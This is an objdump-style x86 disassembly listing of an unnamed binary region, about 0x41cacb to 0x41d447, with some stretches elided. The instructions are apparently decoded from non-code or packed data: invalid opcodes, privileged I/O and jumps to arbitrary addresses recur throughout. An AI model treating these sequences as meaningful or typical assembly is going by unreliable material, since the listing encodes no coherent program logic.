  41cacb:	ja     0x41ca73
  41cacd:	or     edi,ecx
  41cacf:	loop   0x41ca63
  41cad1:	(bad)  
  41cad2:	fsub   QWORD PTR [edi-0x49fac781]
  41cad8:	cs jecxz 0x41caa6
  41cadb:	cli    
  41cadc:	mov    ds:0x53b6d31a,eax
  41cae1:	mov    esp,0x9c12d077
  41cae6:	sbb    BYTE PTR [ebp-0x73],bh
  41cae9:	sub    ecx,DWORD PTR [edi]
  41caeb:	leave  
  41caec:	mov    ebp,esp
  41caee:	mov    al,0xff
  41caf0:	gs jbe 0x41cab2
  41caf3:	das    
  41caf4:	pushf  
  41caf5:	add    eax,0xbb23cd46
  41cafa:	out    dx,eax
  41cafb:	enter  0x6299,0x1b
  41caff:	jmp    0x3f06:0x616866e5
  41cb06:	xor    al,0xef
  41cb08:	add    BYTE PTR ds:0x3c6635e4,bh
  41cb0e:	leave  
  41cb0f:	jb     0x41cad6
  41cb11:	mov    eax,ds:0x9df6a374
  41cb16:	pop    edi
  41cb17:	xchg   edi,eax
  41cb18:	and    DWORD PTR [ebp+eax*8-0x48],eax
  41cb1c:	mov    cx,0xcaea
  41cb20:	push   esi
  41cb21:	fsubr  QWORD PTR [edi]
  41cb23:	mov    BYTE PTR [ecx-0x36],ch
  41cb26:	mov    eax,ds:0xac106f17
  41cb2b:	scas   eax,DWORD PTR es:[edi]
  41cb2c:	mov    ch,0xc0
  41cb2e:	xlat   BYTE PTR ds:[ebx]
  41cb2f:	push   0x190d96af
  41cb34:	mov    bh,0x90
  41cb36:	int3   
  41cb37:	fdiv   st(7),st
  41cb39:	jnp    0x41cb19
  41cb3b:	adc    eax,0x9ae5f643
  41cb40:	jae    0x41cb3b
  41cb42:	sbb    dh,BYTE PTR [edi+eax*2-0x14fa8650]
  41cb49:	mov    bh,0xf8
  41cb4b:	mov    bl,dl
  41cb4d:	xor    ch,dh
  41cb4f:	jns    0x41cb53
  41cb51:	inc    ebx
  41cb52:	pop    ds
  41cb53:	int    0x1
  41cb55:	pop    ss
  41cb56:	jns    0x41caed
  41cb58:	sbb    ebp,DWORD PTR [esi]
  41cb5a:	sahf   
  41cb5b:	and    ecx,ebx
  41cb5d:	or     esi,ebp
  41cb5f:	jo     0x41cbda
  41cb61:	mov    esi,0x9649e2ce
  41cb66:	sbb    DWORD PTR [esi-0x3d],ebp
  41cb69:	sub    ebp,DWORD PTR [edx]
  41cb6b:	repz dec ebx
  41cb6d:	scas   al,BYTE PTR es:[edi]
  41cb6e:	jl     0x41cafd
  41cb70:	mov    edx,ebx
  41cb72:	rol    esi,cl
  41cb74:	rol    ebx,0x80
  41cb77:	repz bnd jnp 0x41cb36
  41cb7b:	pop    ds
  41cb7c:	cdq    
  41cb7d:	ret    0x72ca
  41cb80:	mov    ah,al
  41cb82:	stos   BYTE PTR es:[edi],al
  41cb83:	imul   ebx,DWORD PTR [edx],0xffffffbd
  41cb86:	mov    eax,ds:0x1f1fd815
  41cb8b:	bound  ebx,QWORD PTR [edx-0x13]
  41cb8e:	cmp    eax,0x2
	...
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x71f92a22
  41cc03:	add    al,0x54
  41cc05:	xor    DWORD PTR [ecx],eax
  41cc07:	add    BYTE PTR [ecx+eax*1],al
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	cwde   
  41cc0d:	inc    eax
  41cc0e:	pop    ecx
  41cc0f:	call   0xe2e4:0x489cad08
  41cc16:	sub    eax,0x419e901f
  41cc1b:	mov    bl,0x0
  41cc1d:	out    0xc0,eax
  41cc1f:	dec    ecx
  41cc20:	ins    DWORD PTR es:[edi],dx
  41cc21:	out    0xbb,eax
  41cc23:	cmp    BYTE PTR [eax+0x475319cd],ah
  41cc29:	ja     0x41cbbe
  41cc2b:	or     edi,eax
  41cc2d:	and    al,BYTE PTR [eax]
  41cc2f:	fisubr WORD PTR [ebp+0x35]
  41cc32:	mov    ebx,DWORD PTR [eax-0x366de0e3]
  41cc38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc39:	loope  0x41cc6f
  41cc3b:	jne    0x41ccb1
  41cc3d:	lods   eax,DWORD PTR ds:[esi]
  41cc3e:	mov    WORD PTR [ecx+0x2a04bfde],?
  41cc44:	jl     0x41cc16
  41cc46:	scas   eax,DWORD PTR es:[edi]
  41cc47:	mov    edi,0xa4b0262
  41cc4c:	jbe    0x41ccc5
  41cc4e:	scas   eax,DWORD PTR es:[edi]
  41cc4f:	or     BYTE PTR [eax+0x55],ch
  41cc52:	dec    esp
  41cc53:	cmc    
  41cc54:	int3   
  41cc55:	push   cs
  41cc56:	test   eax,0x49884d6d
  41cc5b:	jg     0x41cbf9
  41cc5d:	(bad)  
  41cc5e:	push   esp
  41cc5f:	stos   BYTE PTR es:[edi],al
  41cc60:	ret    
  41cc61:	fsub   QWORD PTR [eax+0x37270ea7]
  41cc67:	dec    eax
  41cc68:	xchg   ebx,eax
  41cc69:	cmp    cl,BYTE PTR [esi]
  41cc6b:	pusha  
  41cc6c:	jmp    0x92e1e22a
  41cc71:	call   0xdbea3199
  41cc76:	sub    al,0x1e
  41cc78:	or     edi,DWORD PTR [esi]
  41cc7a:	clc    
  41cc7b:	mov    bl,0x74
  41cc7d:	mov    edx,0x2713015a
  41cc82:	adc    eax,0xc1636f47
  41cc87:	leave  
  41cc88:	lods   al,BYTE PTR ds:[esi]
  41cc89:	inc    ebx
  41cc8a:	call   0x9724:0x3222f9e0
  41cc91:	(bad)  
  41cc92:	dec    esi
  41cc93:	push   cs
  41cc94:	push   ds
  41cc95:	rcl    DWORD PTR [esi-0x4bbef530],cl
  41cc9b:	sbb    BYTE PTR [edi-0x506bae9f],dl
  41cca1:	stos   DWORD PTR es:[edi],eax
  41cca2:	xlat   BYTE PTR ds:[ebx]
  41cca3:	ins    DWORD PTR es:[di],dx
  41cca5:	stc    
  41cca6:	inc    eax
  41cca7:	mov    ds:0xed636188,al
  41ccac:	fcmovne st,st(4)
  41ccae:	fwait
  41ccaf:	adc    DWORD PTR [ebp-0x5d],0xffffff82
  41ccb3:	xchg   ebx,eax
  41ccb4:	pop    DWORD PTR [edx+0x114fcb85]
  41ccba:	cs inc edx
  41ccbc:	pop    eax
  41ccbd:	test   DWORD PTR [esi+0x1d],esp
  41ccc0:	or     DWORD PTR [edx+0x5b],0x46
  41ccc4:	jmp    0xd3c9c892
  41ccc9:	mov    ch,0xbf
  41cccb:	pop    eax
  41cccc:	adc    al,0x81
  41ccce:	xlat   BYTE PTR ds:[ebx]
  41cccf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccd0:	push   0xffffff81
  41ccd2:	sti    
  41ccd3:	sbb    ebx,ecx
  41ccd5:	jecxz  0x41cce8
  41ccd7:	ret    
  41ccd8:	cwde   
  41ccd9:	out    0x8b,al
  41ccdb:	js     0x41cd1e
  41ccdd:	fldenv [ebx-0x34]
  41cce0:	(bad)  
  41cce1:	dec    ebp
  41cce2:	and    al,0x93
  41cce4:	int3   
  41cce5:	out    0x6c,eax
  41cce7:	jbe    0x41cc8b
  41cce9:	mov    cl,0x47
  41cceb:	pop    ebp
  41ccec:	fsub   DWORD PTR [esi+0x41d7d4eb]
  41ccf2:	sar    BYTE PTR [esi+0x28],0x6a
  41ccf6:	out    0x3,al
  41ccf8:	nop
  41ccf9:	jmp    0x6d8a78ce
  41ccfe:	mov    al,ds:0x60a3f61b
  41cd03:	test   BYTE PTR [esp+eax*4],dl
  41cd06:	cld    
  41cd07:	xor    ch,BYTE PTR [ebx]
  41cd09:	add    DWORD PTR [edi-0x2f43b9af],ebx
  41cd0f:	xchg   ebp,eax
	...
  41cd74:	pusha  
  41cd75:	cdq    
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	in     al,dx
  41cd81:	jae    0x41cde9
  41cd83:	jb     0x41cddd
  41cd85:	xor    al,BYTE PTR [ecx]
  41cd87:	add    BYTE PTR [ecx+eax*1],al
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	pop    ebp
  41cd8d:	mul    DWORD PTR [eax-0x657e6f7b]
  41cd93:	push   edi
  41cd94:	sub    eax,DWORD PTR ds:0xbaace611
  41cd9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd9b:	jae    0x41ce11
  41cd9d:	push   fs
  41cd9f:	push   ecx
  41cda0:	add    ah,BYTE PTR [edi]
  41cda2:	fst    QWORD PTR [ebx-0x3221fbf]
  41cda8:	std    
  41cda9:	pop    edx
  41cdaa:	adc    BYTE PTR [edi+0x21],bl
  41cdad:	cmp    BYTE PTR [ebp-0x2eeb9f11],bl
  41cdb3:	xchg   esi,eax
  41cdb4:	pop    esp
  41cdb5:	popa   
  41cdb6:	inc    edi
  41cdb7:	das    
  41cdb8:	sbb    BYTE PTR [edi],ch
  41cdba:	data16 data16 mov ds:0xaf179da3,al
  41cdc1:	je     0x41ce18
  41cdc3:	mov    eax,0x3f6d8cea
  41cdc8:	bswap  ecx
  41cdca:	add    DWORD PTR [ebx+0x5c40ed5a],esi
  41cdd0:	pusha  
  41cdd1:	shr    bh,0x9b
  41cdd4:	es stos DWORD PTR es:[edi],eax
  41cdd6:	cmp    al,0xb1
  41cdd8:	xchg   bl,ch
  41cdda:	cmp    al,0xc6
  41cddc:	rol    BYTE PTR [eax+ebx*2-0x5d],cl
  41cde0:	push   edx
  41cde1:	call   0x64d2:0xc92c63a9
  41cde8:	ds push 0x18
  41cdeb:	push   0x4db19d20
  41cdf0:	mov    ds,ebp
  41cdf2:	ins    DWORD PTR es:[edi],dx
  41cdf3:	xchg   BYTE PTR [edi+0x79],ch
  41cdf6:	pop    esi
  41cdf7:	lods   al,BYTE PTR ds:[esi]
  41cdf8:	out    0xa7,eax
  41cdfa:	cmp    DWORD PTR [edi+0x5],eax
  41cdfd:	mov    esi,0xa3b910ef
  41ce02:	sub    ch,dl
  41ce04:	add    DWORD PTR [ebx-0x2f],edx
  41ce07:	xor    esp,edi
  41ce09:	mov    eax,ds:0x403bd8fb
  41ce0e:	mov    bl,0x58
  41ce10:	fsubr  DWORD PTR [eax-0x3ae2f4e6]
  41ce16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce17:	leave  
  41ce18:	and    eax,0xfe1d427a
  41ce1d:	aad    0x5b
  41ce1f:	jp     0x41ce81
  41ce21:	retf   0xb5cc
  41ce24:	outs   dx,DWORD PTR ds:[esi]
  41ce25:	iret   
  41ce26:	cmp    eax,0xb79d3e2b
  41ce2b:	mov    ecx,0x286f168f
  41ce30:	pop    ecx
  41ce31:	es push 0x1a1a1509
  41ce37:	and    ebp,0xffffffee
  41ce3a:	fwait
  41ce3b:	retf   0xc5d1
  41ce3e:	fiadd  DWORD PTR [eax+0x63a9c5b1]
  41ce44:	push   eax
  41ce45:	fcmovbe st,st(0)
  41ce47:	bound  eax,QWORD PTR [ebp+eax*8-0x262d67e2]
  41ce4e:	js     0x41ce8a
  41ce50:	(bad)  
  41ce51:	fimul  WORD PTR [esi+0x73]
  41ce54:	dec    ecx
  41ce55:	aaa    
  41ce56:	adc    al,0xa4
  41ce58:	jne    0x41ce0e
  41ce5a:	dec    esp
  41ce5b:	sti    
  41ce5c:	add    bh,BYTE PTR [ebx+0x1ed86ec7]
  41ce62:	sahf   
  41ce63:	outs   dx,BYTE PTR ds:[esi]
  41ce64:	jae    0x41cdf7
  41ce66:	pop    ecx
  41ce67:	lahf   
  41ce68:	xchg   edi,eax
  41ce69:	clc    
  41ce6a:	cwde   
  41ce6b:	imul   ecx,DWORD PTR [esi],0xffffff99
  41ce6e:	pop    esp
  41ce6f:	xchg   edi,eax
  41ce70:	ror    DWORD PTR [ebp+0x7f4c8fbb],cl
  41ce76:	jns    0x41ce2b
  41ce78:	mov    BYTE PTR [edx],al
  41ce7a:	jno    0x41ce3a
  41ce7c:	ins    DWORD PTR es:[edi],dx
  41ce7d:	sbb    edi,DWORD PTR [esi-0x5e4f5a05]
  41ce83:	enter  0x2cf4,0x2e
  41ce87:	dec    ebx
  41ce88:	bound  esp,QWORD PTR [edi-0x7b9173c6]
  41ce8e:	or     al,0xbc
	...
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	int    0x5d
  41cf02:	addr16 pop ebx
  41cf04:	pop    esp
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR [ecx+eax*1],al
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	inc    esp
  41cf0d:	xor    ecx,edi
  41cf0f:	ud2    
  41cf11:	test   al,0xb6
  41cf13:	retf   
  41cf14:	fsubp  st(4),st
  41cf16:	lods   eax,DWORD PTR ds:[esi]
  41cf17:	out    dx,al
  41cf18:	imul   ecx,DWORD PTR [ecx],0x5f0fbc99
  41cf1e:	loop   0x41cf15
  41cf20:	jo     0x41cf1f
  41cf22:	xor    DWORD PTR [edx+0x51cf53f9],ebx
  41cf28:	shl    BYTE PTR [ebx-0x23],cl
  41cf2b:	popf   
  41cf2c:	mov    bl,0xde
  41cf2e:	(bad)  
  41cf2f:	xchg   ebx,eax
  41cf30:	push   eax
  41cf31:	imul   edx,DWORD PTR [esp+edx*4+0x7745a9c5],0x7183fcca
  41cf3c:	dec    edx
  41cf3d:	lods   al,BYTE PTR ds:[esi]
  41cf3e:	ret    
  41cf3f:	xchg   ecx,eax
  41cf40:	mov    eax,ds:0x5a9bd887
  41cf45:	xor    eax,0xb7d21e61
  41cf4a:	pusha  
  41cf4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf4c:	push   eax
  41cf4d:	fstp   DWORD PTR [esp+eiz*8+0x27]
  41cf51:	add    ebx,DWORD PTR [ebp+0x692d9155]
  41cf57:	push   0x4e
  41cf59:	cmp    DWORD PTR [ebp-0x7e],0x3f8e8d97
  41cf60:	fnsave [ecx-0x34]
  41cf63:	mov    cl,0x84
  41cf65:	shl    dl,0x5e
  41cf68:	xchg   ecx,eax
  41cf69:	sub    dl,BYTE PTR [esi-0xa46f23d]
  41cf6f:	pop    esi
  41cf70:	jg     0x41cfca
  41cf72:	pop    ss
  41cf73:	sbb    eax,0x643d25f5
  41cf78:	add    al,0xda
  41cf7a:	(bad)  
  41cf7b:	jmp    0x546a:0x4665e2a7
  41cf82:	mov    ecx,0x268b48f2
  41cf87:	or     edx,DWORD PTR [esi]
  41cf89:	retf   
  41cf8a:	shr    DWORD PTR [ebx-0x4e],1
  41cf8d:	call   0x4e6d:0xb41e1272
  41cf94:	or     DWORD PTR [edx+0x3d9425b6],ebp
  41cf9a:	xor    al,0xc
  41cf9c:	sar    BYTE PTR [edi+0x442fc930],1
  41cfa2:	mov    ds:0xc7a7419f,eax
  41cfa7:	mov    bh,0x5b
  41cfa9:	push   edi
  41cfaa:	cmc    
  41cfab:	push   0xffffffd7
  41cfad:	test   DWORD PTR [ecx],ebx
  41cfaf:	xor    ah,BYTE PTR [edi+0x1a5f0426]
  41cfb5:	aaa    
  41cfb6:	cli    
  41cfb7:	jmp    0x41cfe8
  41cfb9:	jmp    0x41cf86
  41cfbb:	mov    ebx,0x49eb14c4
  41cfc0:	cmp    BYTE PTR [ebx],0xca
  41cfc3:	int    0x25
  41cfc5:	fcmovbe st,st(5)
  41cfc7:	out    dx,eax
  41cfc8:	iret   
  41cfc9:	jo     0x41d00d
  41cfcb:	jmp    0x41d01e
  41cfcd:	enter  0xb296,0x91
  41cfd1:	inc    DWORD PTR [edi+0x1]
  41cfd4:	jg     0x41cfb4
  41cfd6:	mov    edi,0x36e9b5b5
  41cfdb:	jbe    0x41cf64
  41cfdd:	xor    DWORD PTR [edi+0x22fffbb],0xffffffbc
  41cfe4:	mov    al,ds:0x90c9a94b
  41cfe9:	and    ecx,esi
  41cfeb:	imul   ebx,DWORD PTR ds:0xacaefc74,0x1b4c6c76
  41cff5:	retf   
  41cff6:	ins    BYTE PTR es:[edi],dx
  41cff7:	and    eax,DWORD PTR [edx-0x6a08d99a]
  41cffd:	(bad)  
  41cffe:	scas   eax,DWORD PTR es:[edi]
  41cfff:	pop    ebx
  41d000:	push   esp
  41d001:	pop    ebx
  41d002:	outs   dx,DWORD PTR ds:[esi]
  41d003:	pushf  
  41d004:	lea    ebp,[ebx-0x6a]
  41d007:	mov    ch,0x74
  41d009:	fnsave [esi+0x4c63aea1]
  41d00f:	jecxz  0x41d011
	...
  41d071:	add    BYTE PTR [eax],al
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x81771fbd
  41d083:	das    
  41d084:	pusha  
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR [ecx+eax*1],al
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	rol    BYTE PTR [edi],cl
  41d08e:	call   0x5009:0x92b26aa9
  41d095:	loopne 0x41d0c3
  41d097:	jnp    0x41d022
  41d099:	push   esp
  41d09a:	sbb    edi,DWORD PTR [eax]
  41d09c:	in     al,0xe8
  41d09e:	jmp    0x2e1f0fbd
  41d0a3:	xchg   ebp,eax
  41d0a4:	js     0x41d0e2
  41d0a6:	jp     0x41d106
  41d0a8:	adc    BYTE PTR [ebp+ecx*8-0x16be6751],al
  41d0af:	lahf   
  41d0b0:	jns    0x41d11d
  41d0b2:	dec    edi
  41d0b3:	data16 mov cl,ah
  41d0b6:	adc    bh,BYTE PTR [eax]
  41d0b8:	xlat   BYTE PTR ds:[ebx]
  41d0b9:	xchg   ebp,eax
  41d0ba:	sbb    eax,DWORD PTR [ebx]
  41d0bc:	cmp    eax,0x7aac057e
  41d0c1:	mov    ebx,0xbb767f11
  41d0c6:	mov    eax,0x8f2b7390
  41d0cb:	xor    dl,dl
  41d0cd:	mov    al,ds:0x83fb8bc2
  41d0d2:	retf   0x5dc0
  41d0d5:	das    
  41d0d6:	std    
  41d0d7:	push   esi
  41d0d8:	adc    ah,bl
  41d0da:	sete   BYTE PTR [edx+0x6e]
  41d0de:	ins    DWORD PTR es:[edi],dx
  41d0df:	push   ebp
  41d0e0:	pop    esi
  41d0e1:	mov    edi,0x57ee41d2
  41d0e6:	xor    DWORD PTR [esi],ecx
  41d0e8:	dec    esi
  41d0e9:	lahf   
  41d0ea:	test   al,0x46
  41d0ec:	(bad)  
  41d0ed:	lock push ebx
  41d0ef:	mov    eax,ds:0x1b567819
  41d0f4:	fistp  QWORD PTR [ecx-0x57]
  41d0f7:	mov    al,0xb7
  41d0f9:	xchg   DWORD PTR [ebp-0x387a1e14],esp
  41d0ff:	out    dx,eax
  41d100:	or     al,0x3a
  41d102:	gs iret 
  41d104:	dec    ebx
  41d105:	popf   
  41d106:	aam    0x47
  41d108:	xchg   DWORD PTR [esi+0x24],edx
  41d10b:	lock xor al,0x77
  41d10e:	xor    eax,0x930eec8c
  41d113:	xor    ch,al
  41d115:	xchg   BYTE PTR ss:[edi+0x45],bl
  41d119:	and    BYTE PTR [esi+edx*4-0x7d50e83],cl
  41d120:	xchg   esi,eax
  41d121:	shr    BYTE PTR [eax],1
  41d123:	jle    0x41d0ab
  41d125:	inc    edi
  41d126:	out    dx,al
  41d127:	and    DWORD PTR [ebp-0x55e30819],ecx
  41d12d:	test   BYTE PTR [edx+0x5f],ch
  41d130:	scas   al,BYTE PTR es:[edi]
  41d131:	sahf   
  41d132:	sub    DWORD PTR [edi+0x559014b4],0x2e
  41d139:	lds    edx,FWORD PTR [ebp-0x4d]
  41d13c:	hlt    
  41d13d:	(bad)  [edi+ebp*2-0x51]
  41d141:	je     0x41d13e
  41d143:	pop    ss
  41d144:	add    ah,bl
  41d146:	and    ebx,ecx
  41d148:	mov    eax,0x635ab969
  41d14d:	retf   0x45c5
  41d150:	outs   dx,BYTE PTR ds:[esi]
  41d151:	scas   eax,DWORD PTR es:[edi]
  41d152:	push   0x531bc188
  41d157:	ret    
  41d158:	adc    bh,BYTE PTR [ecx+eax*2-0x4c424e4b]
  41d15f:	es fwait
  41d161:	xchg   esi,eax
  41d162:	add    BYTE PTR [esi-0x3e7b74a6],ch
  41d168:	push   ss
  41d169:	ins    DWORD PTR es:[edi],dx
  41d16a:	mov    ch,0x5d
  41d16c:	cmp    edi,edi
  41d16e:	or     al,BYTE PTR [edi-0x69]
  41d171:	and    DWORD PTR [ecx+0x1a622a65],ebp
  41d177:	and    DWORD PTR [ecx-0x1e],ebp
  41d17a:	leave  
  41d17b:	jmp    0x41d14a
  41d17d:	and    DWORD PTR [edi+edi*4+0x2a],esi
  41d181:	mov    eax,eax
  41d183:	lods   eax,DWORD PTR ds:[esi]
  41d184:	push   eax
  41d185:	push   ds
  41d186:	inc    ecx
  41d187:	jns    0x41d1bb
  41d189:	mov    edi,ebp
  41d18b:	hlt    
  41d18c:	adc    BYTE PTR [edi-0x16],dh
  41d18f:	lea    eax,[eax]
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	push   es
  41d201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d202:	cdq    
  41d203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d204:	fs xor eax,0x1040001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	add    eax,0x7c811c95
  41d211:	pop    es
  41d212:	aas    
  41d213:	pop    esi
  41d214:	lods   eax,DWORD PTR ds:[esi]
  41d215:	pusha  
  41d216:	ins    BYTE PTR es:[edi],dx
  41d217:	push   ebx
  41d218:	add    DWORD PTR [ebp+0x369f5ff],esi
  41d21e:	dec    ecx
  41d21f:	and    ecx,DWORD PTR [ebx-0x681ce365]
  41d225:	stos   DWORD PTR es:[edi],eax
  41d226:	aad    0xef
  41d228:	inc    edx
  41d229:	mov    edi,0x84168892
  41d22e:	cmp    DWORD PTR [ebx-0x2c4b6fea],esp
  41d234:	mov    ds:0xf7685452,eax
  41d239:	neg    DWORD PTR [ebx-0x14d4129]
  41d23f:	test   al,0x1f
  41d241:	(bad)  
  41d242:	xchg   BYTE PTR [eax],bh
  41d244:	je     0x41d23a
  41d246:	call   FWORD PTR [edx-0x186fc4ff]
  41d24c:	fwait
  41d24d:	xchg   ebx,eax
  41d24e:	mov    edi,0x201b57fc
  41d253:	fwait
  41d254:	shr    BYTE PTR [eax+0x423a5d3c],cl
  41d25a:	mov    dh,bh
  41d25c:	jge    0x41d1f4
  41d25e:	sar    BYTE PTR [eax],cl
  41d260:	not    BYTE PTR [eax+0x5e276254]
  41d266:	in     eax,0xfa
  41d268:	clc    
  41d269:	out    dx,al
  41d26a:	sahf   
  41d26b:	xlat   BYTE PTR ds:[ebx]
  41d26c:	out    0x19,al
  41d26e:	mov    eax,ds:0x1160bbc5
  41d273:	mov    ds:0x50af6f8f,al
  41d278:	hlt    
  41d279:	pop    esi
  41d27a:	in     al,dx
  41d27b:	xchg   esp,eax
  41d27c:	inc    edx
  41d27d:	xchg   DWORD PTR [ebx],eax
  41d27f:	(bad)  
  41d281:	dec    esp
  41d282:	inc    edi
  41d283:	or     BYTE PTR [ebx-0x270d3a01],bl
  41d289:	out    dx,al
  41d28a:	jbe    0x41d299
  41d28c:	xchg   DWORD PTR [ebp-0x1d],eax
  41d28f:	out    0xc4,al
  41d291:	inc    esi
  41d292:	loopne 0x41d282
  41d294:	inc    edx
  41d295:	and    eax,0x567e7155
  41d29a:	xlat   BYTE PTR ds:[ebx]
  41d29b:	gs bnd jns 0x41d317
  41d29f:	sbb    DWORD PTR [ebx],eax
  41d2a1:	popf   
  41d2a2:	or     esp,esi
  41d2a4:	xchg   bh,dh
  41d2a6:	sbb    al,0x1e
  41d2a9:	cmp    BYTE PTR [edx],dl
  41d2ab:	and    bh,BYTE PTR [edi+esi*2+0xa]
  41d2af:	xchg   esp,eax
  41d2b0:	jns    0x41d291
  41d2b2:	retf   
  41d2b3:	stc    
  41d2b4:	enter  0x3269,0x61
  41d2b8:	inc    ebp
  41d2b9:	shl    DWORD PTR [eax],1
  41d2bb:	xchg   DWORD PTR [edi],ecx
  41d2bd:	fidiv  WORD PTR [ecx+0x9b9a52a]
  41d2c3:	aam    0xdb
  41d2c5:	inc    esp
  41d2c6:	jns    0x41d2d8
  41d2c8:	sub    edx,eax
  41d2ca:	push   ebp
  41d2cb:	fist   DWORD PTR [ebx]
  41d2cd:	repnz inc esp
  41d2cf:	bound  eax,QWORD PTR [ecx]
  41d2d1:	inc    ebx
  41d2d2:	pop    ss
  41d2d3:	ins    BYTE PTR es:[edi],dx
  41d2d4:	in     eax,dx
  41d2d5:	sbb    al,BYTE PTR [esi-0x13]
  41d2d8:	cmp    eax,0xfaffde2c
  41d2dd:	rcl    dl,1
  41d2df:	adc    eax,0x604d6a9e
  41d2e4:	mov    al,ds:0x612e9d9f
  41d2e9:	and    eax,0x700e10df
  41d2ee:	push   es
  41d2ef:	imul   ecx,DWORD PTR [eax],0xfffffff5
  41d2f2:	jbe    0x41d2f8
  41d2f4:	jle    0x41d2f6
  41d2f6:	in     al,0x15
  41d2f8:	xchg   BYTE PTR [edi+0x31],dh
  41d2fb:	inc    edi
  41d2fc:	sub    al,0xc3
  41d2fe:	jae    0x41d316
  41d300:	(bad)  
  41d301:	pop    ebx
  41d302:	stos   BYTE PTR es:[edi],al
  41d303:	xlat   BYTE PTR ds:[ebx]
  41d304:	cmp    ebx,edi
  41d306:	mov    ds:0xc43017e0,eax
  41d30b:	xchg   ecx,eax
  41d30c:	inc    edx
  41d30d:	pop    edi
  41d30e:	arpl   WORD PTR [esi+0x0],dx
	...
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d381:	inc    edx
  41d382:	inc    edi
  41d383:	iret   
  41d384:	push   0x4000136
  41d389:	add    DWORD PTR [eax],eax
  41d38b:	add    BYTE PTR [ecx+0x2d],ah
  41d38e:	pop    DWORD PTR [eax]
  41d390:	push   ds
  41d391:	or     al,0xf2
  41d393:	repnz imul eax,esp,0x62
  41d397:	mov    esi,0x16bf35dc
  41d39c:	nop
  41d39d:	std    
  41d39e:	add    al,0x29
  41d3a0:	mov    dl,0xfc
  41d3a2:	and    eax,0xb5109a1c
  41d3a7:	xor    bl,BYTE PTR [eax-0x300a85ca]
  41d3ad:	pop    ecx
  41d3ae:	mov    bh,0x8d
  41d3b0:	xchg   ebp,eax
  41d3b1:	inc    eax
  41d3b2:	dec    ebp
  41d3b3:	sub    al,0xa6
  41d3b5:	fld    TBYTE PTR [esp+esi*2]
  41d3b8:	loope  0x41d3dd
  41d3ba:	and    al,0xfb
  41d3bc:	fist   DWORD PTR [edi-0x58f3bba7]
  41d3c2:	nop
  41d3c3:	or     al,0x8c
  41d3c5:	hlt    
  41d3c6:	inc    edi
  41d3c7:	(bad)  
  41d3c8:	xchg   ebp,eax
  41d3c9:	xor    eax,0x41f606fc
  41d3ce:	dec    eax
  41d3cf:	stc    
  41d3d0:	aaa    
  41d3d1:	jecxz  0x41d3f0
  41d3d3:	mov    eax,ds:0xa99da04d
  41d3d8:	aaa    
  41d3d9:	lea    edi,[ebx]
  41d3db:	mov    dh,0xfc
  41d3dd:	cmp    al,0x4b
  41d3df:	push   ebx
  41d3e0:	in     eax,dx
  41d3e1:	mov    ds:0x40f3d4ce,al
  41d3e6:	div    BYTE PTR ds:0x409c17
  41d3ec:	iret   
  41d3ed:	imul   eax,esp,0x64dbbf20
  41d3f3:	ret    
  41d3f4:	push   edx
  41d3f5:	xor    ebx,edx
  41d3f7:	imul   eax,ecx,0x78
  41d3fa:	push   es
  41d3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3fc:	in     al,dx
  41d3fd:	jne    0x41d400
  41d3ff:	and    DWORD PTR [ebp+eiz*8-0x40],eax
  41d403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d404:	pop    ss
  41d405:	jnp    0x41d432
  41d407:	rol    BYTE PTR [edi],0x39
  41d40a:	aad    0x42
  41d40c:	lea    ebx,[ecx]
  41d40e:	cmp    BYTE PTR [ebx+0x4c],al
  41d411:	add    esp,DWORD PTR [ebp+ebp*8-0x49]
  41d415:	and    ecx,0xffffffb7
  41d418:	enter  0x3883,0xd4
  41d41c:	add    al,0xf3
  41d41e:	ja     0x41d3d4
  41d420:	arpl   WORD PTR [ecx+0x3d251006],si
  41d426:	cmp    ebp,DWORD PTR [ebx]
  41d428:	mov    ebx,0x1c8a7cea
  41d42d:	retf   0x72cb
  41d430:	xchg   esi,eax
  41d431:	aad    0x19
  41d433:	mov    ah,0x43
  41d435:	mov    ebp,0xafa1d3cf
  41d43a:	cdq    
  41d43b:	push   edx
  41d43c:	cwde   
  41d43d:	repz push esi
  41d43f:	nop
  41d440:	lds    eax,FWORD PTR [eax-0x76491dbc]
  41d446:	lods   eax,DWORD PTR ds:[esi]
  41d447:	ins    DWORD PTR es:[edi],dx
